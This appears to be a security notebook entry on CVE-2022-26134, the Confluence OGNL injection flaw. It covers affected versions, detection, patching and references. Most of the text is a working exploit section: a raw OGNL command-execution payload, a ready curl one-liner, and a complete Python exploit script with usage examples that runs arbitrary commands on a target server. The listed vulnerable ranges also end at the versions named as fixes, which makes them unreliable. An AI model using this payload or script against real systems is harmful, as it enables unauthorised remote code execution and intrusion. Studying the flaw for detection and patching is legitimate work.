
On May the 30th, 2022, an organisation named Volexity identified an un-authenticated RCE vulnerability (scoring 9.8 on NIST) within Atlassian's [Confluence Server and Data Center editions](https://www.atlassian.com/software/confluence). Confluence is a collaborative documentation and project management framework for teams. Confluence helps track project status by offering a centralised workspace for members. The following versions of Confluence are vulnerable to this CVE:  

-   1.3.0 -> 7.4.17
-   7.13.0 -> 7.13.7
-   7.14.0 -> 7.14.3 
-   7.15.0 -> 7.15.2 
-   7.16.0 -> 7.16.4
-   7.17.0 -> 7.17.4
-   7.18.0 -> 7.18.1

Vulnerability is within the [OGNL](https://en.wikipedia.org/wiki/OGNL) (Object-Graph Navigation Language) expression language for Java; OGNL is used in Java-based web applications such as Confluence. It allows for the 
execution of methods of Java classes..

## Exploit

URL-encoding and 
```java
${@java.lang.Runtime@getRuntime().exec("<cmd>")}/
```

```bash
# Remember to URL encode the command
# The URL must end with a trailing / not $SF
CMD=
curl -v "http://$host:$port/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22$CMD%22%29%7D/"
```

[Packetstorm Python3 Exploit](https://packetstormsecurity.com/files/167430/Confluence-OGNL-Injection-Remote-Code-Execution.html)

THM version of the Naqwada version that is 404
```python
# -*- coding: utf-8 -*-

# Author:   Naqwada (RuptureFarm 1029) <naqwada@pm.me>
# License:  MIT License (http://www.opensource.org/licenses/mit-license.php)
# Docs:     https://github.com/Naqwa/CVE-2022-26134
# Website:  http://samy.link/
# Linkedin: https://www.linkedin.com/in/samy-younsi/
# Note:     FOR EDUCATIONAL PURPOSE ONLY.

from bs4 import BeautifulSoup
import requests
import urllib3
import re
import sys
urllib3.disable_warnings()

def banner():
  CVE_2022_26134Logo = """
   _______    ________                                
  / ____/ |  / / ____/                                
 / /    | | / / __/                                   
/ /___  | |/ / /___                                   
\____/  |___/_____/___       ___   _____________ __ __
  |__ \ / __ \__ \|__ \     |__ \ / ___<  /__  // // /
  __/ // / / /_/ /__/ /_______/ // __ \/ / /_ </ // /_
 / __// /_/ / __// __/_____/ __// /_/ / /___/ /__  __/
/____/\____/____/____/    /____/\____/_//____/  /_/   
                                                      
                  \033[1;91mCVE-2022-26134 - OGNL injection vulnerability\033[1;m                  
Author: \033[1;92mNaqwada\033[1;m                         
RuptureFarm 1029      
                FOR EDUCATIONAL PURPOSE ONLY.   
  """
  return print('\033[1;94m{}\033[1;m'.format(CVE_2022_26134Logo))


def check_target_version(host):
  try:
    response = requests.get("{}/login.action".format(host), verify=False, timeout=8)
    if response.status_code == 200:
      filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)
      
      if len(filter_version) >= 1:
        version = filter_version[0].split("'>")[1].split('</')[0]
        return version
      else:
        return False
    else:
      return host
  except:
    return False


def send_payload(host, command):   
    payload = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D".format(command)
    response = requests.get("{}/{}/".format(host, payload), verify=False, allow_redirects=False)
    
    try:
      if response.status_code == 302:
          return response.headers["X-Cmd-Response"]
      else:
          return "This target does not seem to be vulnerable."
    except:
      return "This target does not seem to be vulnerable."


def main():
  banner()
  if len(sys.argv) < 3:
    print("\033[1;94mHow to use:\033[1;m")
    print("python3 {} https://target.com cmd".format(sys.argv[0]))
    print("ex: python3 {} https://target.com id".format(sys.argv[0]))
    print("ex: python3 {} https://target.com 'ps aux'".format(sys.argv[0]))
    return
  
  target = sys.argv[1]
  cmd = sys.argv[2]
  version = check_target_version(target)

  if version:
    print("Confluence target version: \033[1;94m{}\033[1;m".format(version))
  else:
    print("Can't find the used version for this target. Is the target offline?")
    return
  
  exec_payload = send_payload(target, cmd) 
  print(exec_payload)

if __name__ == "__main__":
   main()
```


## Detection

Confluence is an Apache Tomcat server which has logging located in `/opt/atlassian/confluence/logs` - search with grep: `grep -R "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22"`

Or use the [[YARA]] [Rule for the CVE](https://github.com/volexity/threat-intel/blob/main/2022/2022-06-02%20Active%20Exploitation%20Of%20Confluence%200-day/indicators/yara.yar)


## Mitigation 

[Atlassian advisory](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html) 
Patch to nearest:
-   7.4.17
-   7.13.7
-   7.14.3
-   7.15.2
-   7.16.4
-   7.17.4
-   7.18.1

## References

[THM Atlassian Room](https://tryhackme.com/room/cve202226134)
[Wikipedia OGNL](https://en.wikipedia.org/wiki/OGNL)
[Atlassian advisory](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html) 
[Rule for the CVE](https://github.com/volexity/threat-intel/blob/main/2022/2022-06-02%20Active%20Exploitation%20Of%20Confluence%200-day/indicators/yara.yar)
[NIST National Vulnerability Database Entry (CVE-2022-26134)](https://nvd.nist.gov/vuln/detail/CVE-2022-26134)
[Hunting for Confluence RCE - CVE-2022–26134](https://medium.com/@th3b3ginn3r/hunting-for-cve-2022-26134-confluence-rce-on-linux-server-ae9ce0176b4a)
[Exploring and remediating the Confluence RCE](https://www.datadoghq.com/blog/confluence-vulnerability-overview-and-remediation/)
[What is OGNL Injection?](https://www.contrastsecurity.com/glossary/ognl-injection-ognl)
[Citrix: Guidance for reducing unauthenticated OGNL injection RCE](https://www.citrix.com/blogs/2022/06/09/reducing-unauthenticated-ognl-injection-security-vulnerability-risk-cve-2022-26134/)
[Exploring OGNL Injection in Apache Struts](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts)
[Packetstorm Python3 Exploit](https://packetstormsecurity.com/files/167430/Confluence-OGNL-Injection-Remote-Code-Execution.html)